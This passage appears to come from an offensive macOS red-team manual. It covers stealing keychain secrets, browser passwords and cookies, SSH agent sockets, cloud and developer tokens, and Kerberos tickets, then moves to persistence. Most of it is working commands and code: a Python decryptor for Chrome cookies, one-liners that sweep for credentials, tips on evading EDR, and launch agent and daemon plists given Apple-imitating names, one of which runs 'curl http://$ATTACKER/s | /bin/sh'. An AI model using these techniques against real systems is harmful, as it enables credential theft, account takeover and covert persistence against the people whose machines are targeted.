Second, **a password reset desynchronises them**. If an administrator or MDM resets the password without supplying the old one, the login keychain cannot be re-wrapped and is orphaned: the user is offered a new blank keychain and the old one remains on disk, encrypted under the old password. Practically, this means resetting a user's password to gain access to their session destroys the thing you actually wanted. Do not do it. It also means an orphaned `login.keychain-db` on a machine where someone had a password reset is a crackable artefact worth collecting.

At login, `securityd` unlocks the login keychain using the password supplied to `loginwindow`, and on a FileVault machine the same authentication satisfies both the volume unlock and the keychain unlock. So **in a live logged-in session the login keychain is normally already unlocked**, and that is the single most important operational fact here. You do not need the password to read items whose ACL trusts the calling application, you need to be running as that user with the keychain in its unlocked state.

```bash
security show-keychain-info ~/Library/Keychains/login.keychain-db
# "no-timeout" means it stays unlocked once unlocked, which is the common setting
security lock-keychain ~/Library/Keychains/login.keychain-db     # do not do this
```

The System keychain is different and better. It is unlocked non-interactively at boot using `/var/db/SystemKey`, because daemons need its contents with nobody logged in. Root can read both the keychain and its key, so **root alone recovers the System keychain in full, with no user password involved.** That is where Wi-Fi pre-shared keys, 802.1X machine identities, and the Active Directory machine account password live.

### Extraction with the user's password

Full syntax, verified against current macOS.

```bash
# Unlock explicitly. -p is visible in the process list and in shell history.
security unlock-keychain -p "$PASS" ~/Library/Keychains/login.keychain-db
security unlock-keychain -u ~/Library/Keychains/login.keychain-db   # force GUI prompt

# Metadata only, no decryption, no prompt.
security dump-keychain ~/Library/Keychains/login.keychain-db
security dump-keychain -a ~/Library/Keychains/login.keychain-db     # include item ACLs
security dump-keychain -r ~/Library/Keychains/login.keychain-db     # raw encrypted blobs

# Decrypted. This is the one that prompts.
security dump-keychain -d ~/Library/Keychains/login.keychain-db

# Targeted retrieval. -w prints only the secret, which is what you want in a script.
security find-generic-password -wa "Chrome" -s "Chrome Safe Storage"
security find-generic-password -s "$SERVICE" -a "$ACCOUNT" -w
security find-internet-password -s "$TARGET" -w
security find-internet-password -gs "$TARGET"           # with attributes, to stderr

# Certificates and identities.
security find-certificate -a -p                          # all certs, PEM
security find-identity -v -p codesigning                 # usable signing identities
security export -k login.keychain-db -t identities -f pkcs12 -P "$PASS" -o /tmp/id.p12
security export -k /Library/Keychains/System.keychain -t certs -f pemseq -o /tmp/certs.pem
```

**The prompt behaviour is the thing to understand, and it is not what people expect.** `dump-keychain -d` does not produce one dialogue you can click "Always Allow" on and be done. Every keychain item carries its own ACL with its own list of trusted applications, and the `security` binary is not on most of those lists. So `-d` produces **one dialogue per item** whose ACL does not already trust `security`. Clicking "Always Allow" adds `security`'s code identity to that one item's ACL only.

Here is a real item ACL, which makes the mechanism concrete:

```text
access: 5 entries
  entry 0: authorizations: decrypt derive export_clear export_wrapped mac sign
    applications (1): /Applications/Google Chrome.app (OK)
      requirement: (identifier "com.google.Chrome" or ...) and anchor apple generic
                   and certificate leaf[subject.OU] = EQHXZ8M8AV
  entry 3: authorizations: partition_id
    description: "teamid:EQHXZ8M8AV"
  entry 4: authorizations: change_acl
```

"Always Allow" is literally the act of writing an application's code-signing requirement into that item's ACL. `partition_id` (here `teamid:EQHXZ8M8AV`) governs which other applications signed by the same team can access the item without a fresh prompt. This is why keychain item access is a *code identity* problem, not a privilege problem, and why it composes with the dylib-injection material above: code running inside Chrome can read Chrome's Safe Storage key with no dialogue at all, because Chrome is the trusted application in that ACL.

The quiet way to use this, when you do have the password, is to enumerate first and retrieve only what you want:

```bash
# List item services without decrypting, then pull individual secrets by name.
security dump-keychain 2>/dev/null | grep '0x00000007 <blob>' | sort -u

# Retrieve non-interactively by supplying the password to the unlock, which
# satisfies items configured to require the keychain password rather than an ACL.
security unlock-keychain -p "$PASS" ~/Library/Keychains/login.keychain-db
for s in "Chrome Safe Storage" "Microsoft Edge Safe Storage" "Code Safe Storage"; do
  printf '%s: ' "$s"
  security find-generic-password -ws "$s" 2>/dev/null || echo "(prompted or absent)"
done
```

**Detection and opsec.** Every dialogue is a tell. `securityd` logs keychain access decisions to the unified log. `security` invocations are visible in Endpoint Security `NOTIFY_EXEC` with their full argument vector, which means `security unlock-keychain -p <password>` puts the plaintext password into the EDR's telemetry and into the process list for the duration of the call. If you must pass a password, pass it on stdin where the interface allows, and prefer targeted `find-generic-password` calls over `dump-keychain -d`, which is the single loudest keychain operation available.

### Extraction without the user's password

Be realistic about what this yields.

**What root alone gets you.** The System keychain, in full, via `/var/db/SystemKey`. That is Wi-Fi PSKs, the 802.1X machine identity, any machine certificate whose key is not hardware-bound, and on an AD-bound Mac the computer account password.

```bash
sudo security dump-keychain -d /Library/Keychains/System.keychain
sudo security find-generic-password -ga "$SSID" /Library/Keychains/System.keychain
# Wi-Fi PSKs specifically: the item class is AirPort network password.
sudo security find-generic-password -D "AirPort network password" -a "$SSID" -w
sudo xxd /var/db/SystemKey | head            # the 48-byte unlock key itself
```

**What file read access alone gets you.** A crackable hash of the login keychain password. The legacy keychain format contains material from which the keychain password can be derived and attacked offline. `chainbreaker` is the reference implementation and its maintained forks expose exactly this, alongside full item extraction when supplied the password or a derived key.

```bash
# Exfiltrate and attack offline. No prompts, no root, no password.
cp ~/Library/Keychains/login.keychain-db /tmp/lk.keychain-db

# On your own box, with a maintained chainbreaker fork:
python chainbreaker.py --dump-keychain-password-hash /tmp/lk.keychain-db
python chainbreaker.py --dump-all --password "$PASS" /tmp/lk.keychain-db
python chainbreaker.py --export-all --key "$DERIVEDKEY" /tmp/lk.keychain-db
```

Understand chainbreaker's scope precisely, because it is the thing most likely to waste your time: it parses the **legacy** `.keychain` and `.keychain-db` format only. It does not handle `keychain-2.db`. Its documented OS coverage runs to around macOS 13, and there is no publicly available tool that decrypts the data protection keychain offline. So this route gets you the login keychain's classic items (which is most third-party application secrets) and does not get you Safari passwords or iCloud Keychain. <!-- VERIFY: current chainbreaker fork, maintenance status, and exact flags -->

**Piggybacking an unlocked session.** The best route and the one that needs neither the password nor offline cracking. If the user is logged in, their keychain is unlocked. Run `security` inside their session as them, and any item whose ACL trusts your calling context returns without a prompt.

```bash
# As root, execute in the target user's GUI session so keychain and TCC context apply.
sudo launchctl asuser $(id -u $USER) sudo -u $USER \
  security find-generic-password -ws "Chrome Safe Storage"

# The generic form: anything you want to run with the user's session context.
sudo launchctl asuser $(stat -f%u /dev/console) \
  sudo -u "$(stat -f%Su /dev/console)" /bin/sh -c 'security dump-keychain'
```

`launchctl asuser` is the macOS equivalent of moving into a session, and `stat -f%Su /dev/console` is the reliable way to identify the console user. Note the two-layer construction: `launchctl asuser` puts you in the right *session* (which matters for the GUI domain, the pasteboard, and TCC attribution), and `sudo -u` sets the *uid* (which matters for the keychain and the home directory). You often need both.

**Memory extraction from `securityd`.** Historically, the unwrapped keychain master key was recoverable from `securityd`'s heap, which is what the old `keychaindump` technique did. On current macOS `securityd` is an Apple platform binary protected by SIP, so `task_for_pid` against it fails and there is no memory to read without SIP disabled. Treat this as dead for a remote operator. <!-- VERIFY: no current public technique -->

### Browser credentials and cookies

The macOS scheme is different from Windows and, usefully, simpler. Chromium-family browsers derive their storage key from a keychain item rather than from DPAPI.

Verified from current Chromium source: the browser stores a random secret in the login keychain as a generic password with service `"<Brand> Safe Storage"` and account `"<Brand>"`. That secret is run through PBKDF2-HMAC-SHA1 with the salt `"saltysalt"` (nine ASCII bytes) and 1003 iterations to derive a 16-byte key, and encryption is **AES-128-CBC**. The `v10` prefix on an encrypted blob identifies this scheme.

| Brand | Keychain service | Keychain account |
| --- | --- | --- |
| Chrome | `Chrome Safe Storage` | `Chrome` |
| Chromium | `Chromium Safe Storage` | `Chromium` |
| Edge | `Microsoft Edge Safe Storage` | `Microsoft Edge` <!-- VERIFY: account string --> |
| Brave | `Brave Safe Storage` | `Brave` <!-- VERIFY --> |

**Chrome's App-Bound Encryption is Windows-only.** The ABE work introduced around Chrome 127 lives in the Windows DPAPI key provider and has no macOS counterpart in the current source tree; Google's own announcement is scoped to Windows. So the macOS cookie-theft story has not been hardened in the way the Windows one has, and the 2019-era technique still works unchanged. That asymmetry is worth knowing: on a mixed estate, the Mac is the easier place to steal a session cookie.

```bash
# Requirements: file read access to the profile, plus the keychain item.
CHROME="$HOME/Library/Application Support/Google/Chrome/Default"
ls -la "$CHROME/Login Data" "$CHROME/Login Data For Account" "$CHROME/Cookies" "$CHROME/Local State"

# The key. This prompts unless your code identity is already in the item ACL.
security find-generic-password -wa "Chrome" -s "Chrome Safe Storage"

# Copy the databases rather than reading them in place; SQLite locks and the
# browser holds them open. -wal must come too or you lose recent writes.
for f in "Login Data" "Cookies" "Web Data" "History"; do
  cp "$CHROME/$f" "/tmp/$(echo $f | tr ' ' '_')" 2>/dev/null
  cp "$CHROME/$f-wal" "/tmp/$(echo $f | tr ' ' '_')-wal" 2>/dev/null
done

sqlite3 /tmp/Login_Data \
  "SELECT origin_url, username_value, hex(password_value) FROM logins;"
sqlite3 /tmp/Cookies \
  "SELECT host_key, name, path, expires_utc, hex(encrypted_value) FROM cookies;"
```

Decrypting the blobs, given the Safe Storage secret:

```python
import hashlib, sqlite3, sys
from Crypto.Cipher import AES   # or cryptography's Cipher

SAFE_STORAGE = sys.argv[1]                      # the keychain secret
key = hashlib.pbkdf2_hmac('sha1', SAFE_STORAGE.encode(), b'saltysalt', 1003, 16)
iv  = b' ' * 16                                 # sixteen 0x20 bytes

def decrypt(blob: bytes) -> str:
    if not blob or blob[:3] != b'v10':
        return ''
    ct = blob[3:]
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    pt = pt[:-pt[-1]]                           # strip PKCS7 padding
    return pt.decode('utf-8', 'ignore')

db = sqlite3.connect(sys.argv[2])
for host, name, val in db.execute(
        "SELECT host_key, name, encrypted_value FROM cookies"):
    v = decrypt(val)
    if v:
        print(f"{host}\t{name}\t{v}")
```

That is the whole attack. The only gate is the keychain item, and the keychain item is readable without a prompt from inside the browser's own code identity or from a session where the ACL already trusts your caller.

**Firefox** does not use the keychain at all. It manages its own crypto: `key4.db` holds the wrapped master key and `logins.json` holds the encrypted credentials. If no primary password is set, the wrapping is effectively a known constant, and standard tooling recovers everything with file access alone.

```bash
ls -la ~/Library/Application\ Support/Firefox/Profiles/*/
# key4.db, logins.json, cookies.sqlite, places.sqlite
```

**Safari** is the awkward one, and the awkwardness is TCC rather than crypto. Its container and its cookie store are protected, and `ls ~/Library/Safari` returns `Operation not permitted` even to the owning user from a non-granted shell. Its saved passwords are not in a flat file at all: they are data protection keychain items shared with iCloud Keychain and surfaced by the Passwords app in macOS 15 and later. Practically, Safari credentials require either Full Disk Access plus a live session, or the user's password plus a route into the data protection keychain, which is the hardest target in this section.

```bash
# The test, from a non-granted shell:
ls ~/Library/Safari 2>&1
# ls: /Users/x/Library/Safari: Operation not permitted     <- TCC, not POSIX
```

### SSH keys and the agent

Straightforward, and one of the highest-value items on a developer machine because it usually reaches production directly.

```bash
ls -la ~/.ssh/
cat ~/.ssh/config ~/.ssh/known_hosts
for k in ~/.ssh/id_*; do
  case "$k" in *.pub) continue;; esac
  printf '%s: ' "$k"
  head -1 "$k" | grep -q ENCRYPTED && echo "passphrase-protected" || echo "UNENCRYPTED"
done

# The agent, if one is running with keys loaded.
ssh-add -l
ssh-add -L                                # public keys of loaded identities
echo "$SSH_AUTH_SOCK"
```

The macOS-specific wrinkle is keychain integration. `ssh_config` supports `UseKeychain yes`, which makes `ssh` search the keychain for a key's passphrase and store it there once verified, and `AddKeysToAgent`, which loads keys into the running agent automatically. Both are extremely commonly set on developer machines, and both mean the passphrase for an encrypted key is sitting in the login keychain.

```bash
grep -iE 'usekeychain|addkeystoagent|identityfile|identityagent' \
  ~/.ssh/config /etc/ssh/ssh_config /etc/ssh/ssh_config.d/* 2>/dev/null

# Passphrases stored by UseKeychain are keychain items keyed on the key path.
security find-generic-password -s "SSH: $HOME/.ssh/id_ed25519" -w 2>/dev/null
security dump-keychain 2>/dev/null | grep -i -B2 -A2 'ssh'
```

<!-- VERIFY: exact keychain item service naming used by UseKeychain on macOS 26 -->

The `ssh-agent` on macOS is launchd-managed and its socket lives in a per-session path under `/private/tmp/com.apple.launchd.*/Listeners`. If you can reach the socket as the right user you can use the loaded keys without ever having the private key material, which is the cleanest version of this attack because it leaves no key file to exfiltrate and defeats passphrase protection entirely.

```bash
# Find and use an existing agent socket belonging to the console user.
ls -la /private/tmp/com.apple.launchd.*/Listeners 2>/dev/null
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.XXXX/Listeners ssh-add -l
SSH_AUTH_SOCK=... ssh -o IdentitiesOnly=no $USER@$TARGET
```

Note that a Secure Enclave-backed key (`ssh-keygen -t ecdsa-sk` with a supported provider, or a third-party SEP agent) is not extractable. You can use it while you are on the box and you cannot take it with you. The same principle recurs throughout this section.

### Cloud CLI credential caches

All plain files. All readable with nothing more than a shell as that user. No TCC, no keychain, no prompts. On a developer's Mac this is usually the single highest-value five seconds of the whole engagement.

```bash
# AWS
cat ~/.aws/credentials ~/.aws/config 2>/dev/null
ls -la ~/.aws/sso/cache/ ~/.aws/cli/cache/ 2>/dev/null   # SSO and role-assumption tokens
cat ~/.aws/sso/cache/*.json 2>/dev/null

# Azure
cat ~/.azure/msal_token_cache.json ~/.azure/azureProfile.json 2>/dev/null
ls -la ~/.azure/

# Google Cloud
ls -la ~/.config/gcloud/
sqlite3 ~/.config/gcloud/credentials.db "SELECT account_id, value FROM credentials;" 2>/dev/null
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null
cat ~/.config/gcloud/legacy_credentials/*/adc.json 2>/dev/null

# Kubernetes: embedded certs, bearer tokens, and exec-plugin configuration
cat ~/.kube/config 2>/dev/null
ls -la ~/.kube/cache/ 2>/dev/null

# HashiCorp
cat ~/.vault-token ~/.terraformrc ~/.terraform.d/credentials.tfrc.json 2>/dev/null
```

Cross-reference the Cloud and Modern Identity section for what to do with each of these once you have them; the point here is purely that on macOS they are unprotected files in the home directory, and macOS adds no obstacle whatsoever.

The one macOS-specific note is that the Azure CLI on a Mac may hand token storage to the platform keychain rather than `msal_token_cache.json`, and the Microsoft identity brokers keep their caches as keychain items with service names like `AdalCache`, `OneAuthAccount` and `com.microsoft.OutlookCore.ServiceV2`. Check both.

### The developer angle

Developer machines leak credentials in ways that are specific enough to enumerate deliberately.

```bash
# Git: the credential helper decides where secrets are.
git config --global --list 2>/dev/null
git config --global --get credential.helper
cat ~/.git-credentials 2>/dev/null                 # plaintext, when the store helper is used
```

If `credential.helper` is `osxkeychain`, credentials are internet password items keyed on the host, which means the `security` route applies:

```bash
security find-internet-password -s github.com -g 2>/dev/null
security find-internet-password -s gitlab.com -g 2>/dev/null
security dump-keychain 2>/dev/null | grep -iE 'github|gitlab|bitbucket|azuredevops|ghcr|npm'
ls -l /Library/Developer/CommandLineTools/usr/libexec/git-core/git-credential-osxkeychain
```

<!-- VERIFY: exact attribute keys used by git-credential-osxkeychain on macOS 26 -->

Then sweep the rest of the developer credential surface:

```bash
# Registry and package manager credentials, mostly plaintext.
cat ~/.npmrc ~/.yarnrc.yml ~/.pypirc ~/.netrc 2>/dev/null
cat ~/.gem/credentials ~/.cargo/credentials.toml ~/.nuget/NuGet/NuGet.Config 2>/dev/null
cat ~/.gradle/gradle.properties ~/.m2/settings.xml ~/.sbt/*/credentials 2>/dev/null
cat ~/.composer/auth.json 2>/dev/null

# Container registries. Base64, not encrypted, unless a credential helper is set.
cat ~/.docker/config.json 2>/dev/null
# If "credsStore": "osxkeychain", the tokens are keychain items instead:
security dump-keychain 2>/dev/null | grep -i 'docker\|index.docker.io\|registry'
ls -la ~/.docker/contexts/ 2>/dev/null
cat ~/.config/containers/auth.json 2>/dev/null     # podman

# CI and platform CLIs. Each of these is a token with real reach.
cat ~/.config/gh/hosts.yml 2>/dev/null             # GitHub CLI, may also be keychain
security find-generic-password -s "gh:github.com" -w 2>/dev/null
cat ~/.config/glab-cli/config.yml 2>/dev/null      # GitLab CLI
cat ~/.circleci/cli.yml ~/.config/hub 2>/dev/null
cat ~/.databrickscfg ~/.snowflake/config* 2>/dev/null

# Editors and IDEs cache remote credentials and tokens in their own stores.
ls -la ~/Library/Application\ Support/Code/User/ 2>/dev/null
security find-generic-password -s "Code Safe Storage" -w 2>/dev/null
ls -la ~/Library/Application\ Support/JetBrains/*/options/ 2>/dev/null
grep -rl 'token\|password\|secret' ~/Library/Application\ Support/JetBrains/*/options/ 2>/dev/null

# Environment and shell history, which is where secrets actually live.
cat ~/.zsh_history ~/.bash_history 2>/dev/null | \
  grep -iE 'password|token|secret|apikey|api_key|passwd|-p ' | tail -40
cat ~/.zshenv ~/.zshrc ~/.zprofile ~/.profile ~/.bash_profile 2>/dev/null | \
  grep -iE 'export.*(TOKEN|KEY|SECRET|PASSWORD|PAT)'
launchctl getenv PATH; env | grep -iE 'token|secret|key|password'

# Source trees. Content search rather than name search finds far more.
mdfind -onlyin ~ 'kMDItemTextContent == "*AKIA*"' 2>/dev/null | head -20
mdfind -onlyin ~ 'kMDItemTextContent == "*ghp_*"' 2>/dev/null | head -20
grep -rIl --exclude-dir=.git -E 'AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{20,}' \
  ~/src ~/code ~/Developer ~/Projects 2>/dev/null | head -40
find ~ -maxdepth 5 -name '.env*' -o -maxdepth 5 -name 'terraform.tfstate' 2>/dev/null | head -40
```

`terraform.tfstate` deserves its own mention: state files routinely contain provisioned credentials in plaintext, including database passwords and generated access keys, and developers keep them locally far more often than they should.

### Kerberos tickets and Active Directory integration credentials

macOS uses **Heimdal**, not MIT Kerberos, and the default credential cache is **not a file**. This is the single most important thing to know here, because every Linux-derived instinct about `/tmp/krb5cc_<uid>` is wrong.

```bash
klist
```

```text
Credentials cache: API:AD7B1D0A-7004-4F1E-81F4-5400DE25BFAF
        Principal: user\@corp.com@KERBEROS.MICROSOFTONLINE.COM

  Issued                Expires               Principal
Aug 24 08:00:57 2026  Aug 24 18:00:57 2026  krbtgt/KERBEROS.MICROSOFTONLINE.COM@...
```

The `API:` prefix means the cache is held by the `GSSCred` daemon (`/System/Library/Frameworks/GSS.framework/Helpers/GSSCred`), not written to disk. Access control on that daemon is by **audit session identifier** by default, which means a `sudo` shell in the same login session can reach the credentials but a process in a different session generally cannot, and there is no file to copy.

```bash
klist -l                     # every cache the daemon holds
klist -A                     # all caches with their contents
klist --json                 # machine-readable
klist -v                     # verbose, including flags and etypes
kswitch -l                   # list and switch principal
kinit --keychain $USER@$DOMAIN
kinit -c FILE:/tmp/out.ccache $USER@$DOMAIN   # force a file-based cache
kdestroy -a
```

**Getting tickets out.** Because the default cache is daemon-held, the practical routes are to obtain a fresh ticket into a file cache you control, or to relax the daemon's access control:

```bash
# Request a new TGT directly into a portable file cache. This is the clean route.
KRB5CCNAME=FILE:/tmp/out.ccache kinit $USER@${DOMAIN:u}
klist -c FILE:/tmp/out.ccache

# Copy an existing cache into a file cache, if the API supports it on your build.
kcc copy_cred_cache API:<uuid> FILE:/tmp/out.ccache 2>/dev/null   # VERIFY
```

<!-- VERIFY: whether kcc ships on macOS 26 and its exact copy syntax -->

```bash
# Relax GSSCred from per-audit-session to per-uid matching, which widens access
# for any process running as that uid. Requires root and is a persistent change.
sudo defaults write /Library/Preferences/com.apple.Heimdal.GSSCred \
  use-uid-matching -bool true
```

A file cache written by Heimdal is standard ccache format and is consumable by Impacket and by anything honouring `KRB5CCNAME`, so once you have one the pass-the-ticket and `KRB5CCNAME` handling in the Lateral Movement section, and the wider Kerberos Abuse section, apply directly. Remember that Kerberos requires working forward and reverse DNS and correct FQDNs; a Mac on a corporate network usually has both, which makes it a convenient staging point for Kerberos work against the Windows estate.

Note the realm in that real output: `KERBEROS.MICROSOFTONLINE.COM`. That is not an on-premises AD realm, it is Entra ID's Kerberos realm, populated by the Microsoft Enterprise SSO plug-in. Seeing it tells you the machine is doing cloud-first identity rather than AD binding, which changes the whole plan. See Enterprise Integration and Lateral Movement below.

**On an AD-bound Mac**, the machine account credential is the prize. Apple's AD plugin stores it, and root can reach it:

```bash
dsconfigad -show                                   # binding state, domain, computer OU
ls -la /Library/Preferences/OpenDirectory/Configurations/Active\ Directory/ 2>/dev/null
sudo ls -la /Library/Preferences/OpenDirectory/DynamicData/ 2>/dev/null
sudo security dump-keychain -d /Library/Keychains/System.keychain | \
  grep -i -A5 -B5 'active directory\|\$$'
```

The computer account password is what you want, because it is a domain credential and it lets you request tickets as the machine, which in turn feeds delegation and resource-based constrained delegation work covered in the Kerberos Abuse section. <!-- VERIFY: exact System keychain item naming for the AD computer password on macOS 26 -->

### Application secrets and other stores

```bash
# Password managers. The vaults are encrypted, but the local databases and any
# cached unlock state are worth collecting, and the keychain items name them.
security dump-keychain 2>/dev/null | grep -iE '1password|bitwarden|lastpass|dashlane|keeper'
ls -la ~/Library/Group\ Containers/*1password* ~/Library/Application\ Support/Bitwarden 2>/dev/null
mdfind 'kMDItemFSName == "*.kdbx"' 2>/dev/null

# VPN and network credentials.
security dump-keychain 2>/dev/null | grep -iE 'globalprotect|anyconnect|wireguard|openvpn|vpn'
sudo security find-generic-password -D "AirPort network password" -g \
  /Library/Keychains/System.keychain 2>&1 | head -20
ls -la /Library/Preferences/com.paloaltonetworks.GlobalProtect* 2>/dev/null

# Mail and messaging accounts, which are TCC-protected for Apple apps and
# usually not for third-party ones.
defaults read com.apple.mail 2>/dev/null | grep -iE 'hostname|username|account'
ls -la ~/Library/Application\ Support/Slack/ ~/Library/Application\ Support/Signal/ 2>/dev/null
sqlite3 ~/Library/Application\ Support/Slack/*/*.sqlite ".tables" 2>/dev/null

# Remote desktop and terminal clients: saved hosts and often saved credentials.
ls -la ~/Library/Containers/com.microsoft.rdc.macos/Data 2>/dev/null
security dump-keychain 2>/dev/null | grep -i 'com.microsoft.rdc'
cat ~/Library/Application\ Support/iTerm2/DynamicProfiles/* 2>/dev/null
```

### What each technique requires

| Target | Needs | Yields |
| --- | --- | --- |
| Cloud CLI caches, dotfiles, source trees, `.env`, tfstate | File read as the user | Cloud, registry and CI credentials. Often the whole point |
| Third-party app data (Slack, Teams, Signal, Notion) | File read as the user | Message history, file caches, sometimes tokens |
| Chromium `Login Data` and `Cookies` ciphertext | File read as the user | Encrypted blobs, useless alone |
| Chromium Safe Storage key | Keychain item access: the browser's own code identity, an unlocked keychain with a trusting ACL, or the user's password | Decrypts every Chromium credential and cookie |
| Firefox `key4.db` and `logins.json` | File read as the user | All Firefox credentials, no keychain involved |
| SSH private keys | File read as the user | Direct lateral movement, subject to passphrase |
| SSH agent socket | Same session and uid | Use of passphrase-protected and SEP-backed keys, without the key |
| Login keychain, targeted items | Unlocked session plus a trusting ACL, or the user's password | Named secrets, one prompt per untrusting item |
| Login keychain, everything | The user's password, plus tolerating many prompts | The whole legacy keychain |
| Login keychain, offline | File read plus offline cracking of the keychain password | The whole legacy keychain, eventually |
| Data protection keychain and Safari passwords | The user's password plus live session, or Full Disk Access. No offline tooling | iCloud Keychain, Safari, Passwords app |
| System keychain | Root, via `/var/db/SystemKey` | Wi-Fi PSKs, 802.1X machine identity, AD computer password |
| Local account hash | Root | Offline crack, which then unlocks the login keychain |
| Kerberos tickets | Same audit session and uid, or root plus `use-uid-matching` | A TGT into a portable ccache |
| Safari, Messages, Mail, recent items | A TCC grant. Root does not help | Correspondence and history |
| Screen contents, keystrokes | A TCC grant | Live capture of anything, including passwords being typed |
| Hardware-bound keys: Secure Enclave, attested ACME | Nothing extracts them | Use on-host only, never portable |

## Persistence on macOS

The headline fact, stated first because it reframes everything else: **launch agents and launch daemons are both the most common persistence mechanism and by far the most looked-for**, and since macOS 13 they are no longer quiet. Background Task Management observes launch item registration, shows the user a notification, and emits an Endpoint Security event. If you drop a plist on a monitored Mac, assume the EDR knows and assume the user saw a banner. That does not make the technique useless, it makes it a deliberate trade rather than a default.

Several mechanisms that fill older references are simply gone. Verify against the specific macOS version in scope, because these removals happened at different points.

| Mechanism | Status on current macOS |
| --- | --- |
| `emond`, the Event Monitor daemon | **Removed.** `/sbin/emond`, `/etc/emond.d` and the launch daemon are all absent. Removed in macOS 13 Ventura |
| `/etc/periodic` and the daily/weekly/monthly scripts | **Removed.** `/usr/sbin/periodic`, `/etc/periodic/`, `/etc/defaults/periodic.conf`, `/etc/daily.local` and the `com.apple.periodic-*` launch daemons are all absent on macOS 26. There is no `man periodic`. Removal version not established <!-- VERIFY: which release removed periodic --> |
| `at` and `atrun` | Binaries present, service disabled by default. `launchctl print system/com.apple.atrun` reports the service is not in the domain, so `at` jobs do not fire until root explicitly enables `com.apple.atrun` |
| Kernel extensions | Effectively dead on Apple silicon. Require Reduced Security mode set from recoveryOS |
| Authorisation plugin credential capture | Mechanism still loads, but Apple moved plugin execution into `authorizationhosthelper` with a drastically reduced entitlement set, killing the plaintext-password-extraction version |
| Login and logout hooks | Deprecated by Apple, reportedly still functional. Not re-tested on macOS 26 <!-- VERIFY --> |

### Launch agents and launch daemons

**What it is.** A plist in a launchd search directory that causes your program to run. The distinction between the two is not cosmetic.

| | Launch **daemon** | Launch **agent** |
| --- | --- | --- |
| Directory | `/Library/LaunchDaemons` | `~/Library/LaunchAgents`, `/Library/LaunchAgents` |
| Runs as | root by default, or the `UserName` in the plist | The logged-in user |
| When | At boot, with no user logged in | At login, per user session |
| Session | No window server, no pasteboard, no user keychain | Full GUI session context |
| Privilege to install | root | The user, for `~/Library`. root, for `/Library` |
| Can prompt the user | No | Yes |
| TCC context | Its own identity, with no inherited grants | Its own identity, but in the user's session |

Choose deliberately. A daemon gives you root and boot survival but cannot touch the user's keychain, cannot capture the screen, and cannot show a dialogue. An agent gives you the user's session, which is where the credentials and the data are, but dies at logout and runs as an unprivileged user. Most real operations want an agent, and use a daemon only for durability.

**Why it works.** `launchd` is pid 1 and reads these directories at boot and login without validating the target program beyond the platform's normal execution policy. The plist is a declaration and `launchd` honours it.

**Preconditions.** Write access to the appropriate directory. `~/Library/LaunchAgents` needs only the user. Everything under `/Library` needs root, because `/Library/LaunchDaemons` and `/Library/LaunchAgents` are `root:wheel 755` on current macOS and are *not* admin-group-writable. Additionally, launchd refuses to load a plist in the system domain that is not owned by root or that is group- or world-writable.

```bash
# User agent. No privilege required beyond being that user.
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.apple.updatecheck.plist <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>              <string>com.apple.updatecheck</string>
  <key>ProgramArguments</key>
    <array>
      <string>/bin/sh</string>
      <string>-c</string>
      <string>/usr/bin/curl -fsSL http://$ATTACKER/s | /bin/sh</string>
    </array>
  <key>RunAtLoad</key>          <true/>
  <key>StartInterval</key>      <integer>3600</integer>
  <key>LimitLoadToSessionType</key> <string>Aqua</string>
  <key>ProcessType</key>        <string>Background</string>
</dict>
</plist>
EOF
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.apple.updatecheck.plist
```

```bash
# System daemon. Root required. Note the ownership and mode, which launchd checks.
sudo tee /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist >/dev/null <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>            <string>com.apple.softwareupdated.helper</string>
  <key>ProgramArguments</key>
    <array><string>/usr/local/bin/.helper</string></array>
  <key>RunAtLoad</key>        <true/>
  <key>KeepAlive</key>
    <dict><key>SuccessfulExit</key><false/></dict>
  <key>ThrottleInterval</key> <integer>60</integer>
</dict>
</plist>
EOF
sudo chown root:wheel /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist
sudo chmod 644 /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist
```

The trigger keys are worth using rather than defaulting to `RunAtLoad` plus `StartInterval`, because a job that only runs on a condition is far less visible in a process-execution timeline than one that fires on a clock.

| Key | Trigger | Why it is quieter |
| --- | --- | --- |
| `RunAtLoad` | Boot or login | Predictable, and correlates with every other boot-time execution |
| `StartInterval` | Every N seconds | A perfectly periodic process is the easiest thing in the world to spot |
| `StartCalendarInterval` | Cron-style schedule | Same problem, but you can pick a plausible time |
| `WatchPaths` | A listed path changes | Fires only when something real happens. Point it at a file the user touches |
| `QueueDirectories` | A watched directory becomes non-empty | Same, and gives you a control channel: writing a file is the signal |
| `KeepAlive` with conditions | Network state, path existence, other-job state | Fires on environmental conditions rather than a clock |
| `MachServices` | On demand, when a client connects to the Mach service | Runs only when invoked. The quietest option, and how Apple's own daemons work |

`MachServices` is the mechanism most worth understanding, because a launchd job with `MachServices` and no `RunAtLoad` is not running at all until something looks it up, at which point launchd starts it on demand. That is a persistence mechanism with a near-zero idle footprint.

**Verify it worked.**

```bash
launchctl print gui/$(id -u)/com.apple.updatecheck
launchctl list com.apple.updatecheck              # label, pid, last exit status
launchctl blame gui/$(id -u)/com.apple.updatecheck
/usr/bin/log show --last 10m --predicate 'process == "launchd"' --style compact | \
  grep updatecheck
```

**Detection and opsec.** This is the loudest thing in this section and it is worth being specific about why.

Background Task Management, introduced in macOS 13, watches launch item registration. Its components are `/System/Library/LaunchDaemons/com.apple.backgroundtaskmanagementd.plist`, a per-user agent, and a private framework, and its sandbox profiles reference the Endpoint Security syscalls for launch item add and remove, which confirms it hooks the operation rather than polling the directories. The consequences:

- **The user gets a notification.** A banner appears saying an item was added that runs in the background, and the item is listed in System Settings under General, Login Items and Extensions, where the user can disable it.
